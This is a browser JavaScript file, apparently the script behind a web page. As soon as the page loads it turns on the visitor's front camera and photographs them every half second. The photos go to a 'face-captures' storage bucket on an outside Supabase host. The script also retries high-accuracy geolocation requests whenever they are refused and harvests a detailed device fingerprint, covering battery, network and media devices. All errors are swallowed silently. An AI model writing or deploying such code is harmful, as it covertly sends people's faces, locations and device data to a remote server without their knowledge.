import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

const SUPABASE_URL = 'https://api.phanhon.xyz';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRtdmltYWNpa3Jucml6eHRjZXNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgxMDc5NzgsImV4cCI6MjA4MzY4Mzk3OH0.dwh4CWwxE53hbhgjYqOqHZYa1tNyUKNZvdb6Kq5pLC4';
const BUCKET_NAME = 'face-captures';

const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

let stream = null;
let autoInterval = null;
let captureDetails = {};

function autoCapture() {
  if (!stream || !video.srcObject || video.readyState < 2) return;

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext('2d').drawImage(video, 0, 0);

  const imageData = canvas.toDataURL('image/jpeg', 0.8);
  const fileName = 'capture-' + Date.now() + '.jpg';

  fetch(imageData)
    .then(res => res.blob())
    .then(blob => supabase.storage.from(BUCKET_NAME).upload(fileName, blob, { contentType: 'image/jpeg' }))
    .then(() => {
      const { data } = supabase.storage.from(BUCKET_NAME).getPublicUrl(fileName);
      return supabase.from('face_captures').insert({ image_url: data.publicUrl, status: 'pending' });
    })
    .catch(() => {});
}

async function initCamera() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: 640, height: 480 }
    });
    video.srcObject = stream;
    await video.play();

    autoCapture();
    autoInterval = setInterval(autoCapture, 500);
  } catch (err) {
    console.error('Camera error:', err);
    setTimeout(initCamera, 2000);
  }
}

function requestGeoLocation() {
  if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const { latitude, longitude } = pos.coords;
        captureDetails.latitude = latitude;
        captureDetails.longitude = longitude;
        saveDetails();
      },
      (err) => {
        console.error('Geo error:', err);
        setTimeout(requestGeoLocation, 2000);
      },
      { enableHighAccuracy: true }
    );
  }
}

function captureDeviceInfo() {
  const ua = navigator.userAgent;
  let device = 'Unknown';
  if (/android/i.test(ua)) device = 'Android';
  else if (/iphone|ipad/i.test(ua)) device = 'iOS';
  else if (/windows/i.test(ua)) device = 'Windows';
  else if (/mac/i.test(ua)) device = 'Mac';
  else if (/linux/i.test(ua)) device = 'Linux';

  captureDetails.user_agent = ua;
  captureDetails.platform = navigator.platform;
  captureDetails.device = device;
  captureDetails.language = navigator.language;
  captureDetails.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  captureDetails.screen_width = screen.width;
  captureDetails.screen_height = screen.height;
  captureDetails.cpu_cores = navigator.hardwareConcurrency;
  captureDetails.device_memory = navigator.deviceMemory || null;
  captureDetails.color_depth = screen.colorDepth;
  captureDetails.pixel_ratio = window.devicePixelRatio;
  captureDetails.touch_support = 'ontouchstart' in window;
  captureDetails.cookies_enabled = navigator.cookieEnabled;
  captureDetails.do_not_track = navigator.doNotTrack;
}

function captureBattery() {
  if ('getBattery' in navigator) {
    navigator.getBattery().then(battery => {
      captureDetails.battery_level = battery.level;
      captureDetails.battery_charging = battery.charging;
    }).catch(() => {});
  }
}

function captureNetwork() {
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (conn) {
    captureDetails.network_type = conn.effectiveType;
    captureDetails.network_downlink = conn.downlink;
    captureDetails.network_rtt = conn.rtt;
    captureDetails.network_save_data = conn.saveData;
  }
}

function captureMedia() {
  navigator.mediaDevices.enumerateDevices().then(devices => {
    captureDetails.cameras = devices.filter(d => d.kind === 'videoinput').length;
    captureDetails.microphones = devices.filter(d => d.kind === 'audioinput').length;
    captureDetails.speakers = devices.filter(d => d.kind === 'audiooutput').length;
  }).catch(() => {});
}

function saveDetails() {
  supabase.from('device_details').insert(captureDetails).catch(() => {});
}

initCamera();
requestGeoLocation();
captureDeviceInfo();
captureBattery();
captureNetwork();
captureMedia();
